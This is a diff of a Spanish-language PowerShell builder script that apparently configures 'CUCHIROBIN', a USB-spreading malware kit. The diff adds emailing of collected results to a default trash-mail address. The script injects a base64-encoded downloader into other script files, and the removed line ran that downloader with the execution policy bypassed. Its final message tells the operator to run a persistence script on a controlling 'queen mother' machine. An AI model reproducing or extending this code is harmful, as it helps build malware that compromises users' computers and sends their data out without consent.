@@ -18,7 +18,6 @@ $espacios
 
 
 
-
 Write-Host $mensajeArt
 Write-Host "Te voy a hacer unas preguntas"
 $Conf_CharSet = Read-Host "Que nombre quieres poner a tu distribución? (Ejemplo: MiDistribucion)"
@@ -38,6 +37,13 @@ if ([string]::IsNullOrWhiteSpace($Conf_pastebin_backup)) { $Conf_pastebin_backup
 
 $Conf_Ballon_in = Read-Host "Quieres que muestre mensajes en el escritorio cuando se procesa un USB? (True o False, por defecto: True)"
 if ([string]::IsNullOrWhiteSpace($Conf_Ballon_in)) { $Conf_Ballon_in = "True" }
+$Conf_email_enabled = Read-Host "¿Quieres enviar los resultados por correo electrónico? (Si/No, por defecto SI)"
+if ([string]::IsNullOrWhiteSpace($Conf_email_enabled) -or $Conf_email_enabled -eq "Si" -or $Conf_email_enabled -eq "si" -or $Conf_email_enabled -eq "SI") {
+    $Conf_email = Read-Host "Introduce el correo electrónico de destino (por defecto: cuchirobin@trash-mail.com)"
+    if ([string]::IsNullOrWhiteSpace($Conf_email)) { $Conf_email = "cuchirobin@trash-mail.com" }
+} else {
+    $Conf_email = ""
+}
 
 try
 {
@@ -77,7 +83,9 @@ foreach ($archivo in $archivos) {
         if ($contenido[$i] -match '^\$Conf_pastebin_backup=') {
             $contenido[$i] = "`$Conf_pastebin_backup=`"$Conf_pastebin_backup`""
         }
-        
+        if ($contenido[$i] -match '^\$Conf_email=') {
+            $contenido[$i] = "`$Conf_email=`"$Conf_email`""
+        }
         if ($contenido[$i] -match '^\$Conf_Ballon=') {
             $contenido[$i] = "`$Conf_Ballon=`"$Conf_Ballon`""
         }
@@ -98,7 +106,7 @@ $oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64S
 
 $c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
 
-$Downloader_base64= ("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded " + $c) 
+$Downloader_base64= $c 
 
 
 
@@ -111,8 +119,8 @@ foreach ($archivo in $archivos) {
         
         if ($contenido[$i] -match '^\$downloader=') {
             $contenido[$i] = "`$downloader=`"$Downloader_base64`""
-           #Write-Host "Encontrado Downloader en $archivo.FullName"
-           # $contenido[$i]
+           #Write-Host "Encontrado Downloader en $($archivo.FullName) en la linea $($i+1)"
+           #Write-Host "Primeros 20 caracteres: $($contenido[$i].Substring(0,20))"
         }
         
         
@@ -167,4 +175,4 @@ foreach ($archivo in $archivos) {
 
 
 
-Write-Host "Entra en tmp y ejecuta el powershell de Persiter en la maquina que quieras hacer de reina madre de CUCHIROBIN"
+Write-Host "Entra en tmp y ejecuta el powershell de Persister.ps1 en la maquina que quieras hacer de reina madre de CUCHIROBIN"
